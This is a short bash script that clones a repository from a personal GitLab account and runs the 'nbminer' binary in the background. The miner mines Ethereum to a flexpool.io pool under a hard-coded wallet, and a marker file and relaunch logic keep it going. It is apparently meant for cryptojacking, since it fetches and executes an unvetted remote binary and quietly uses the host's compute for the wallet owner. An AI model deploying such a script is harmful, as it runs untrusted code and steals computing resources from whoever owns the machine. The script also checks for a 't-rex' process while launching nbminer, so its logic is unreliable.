#!/bin/bash
woker=$(date +'%d_%m_%H_%M_%S')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
	echo "Start setup..."
	echo "B8648rns22" > B8648rns22.txt
	git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
	fi
fi
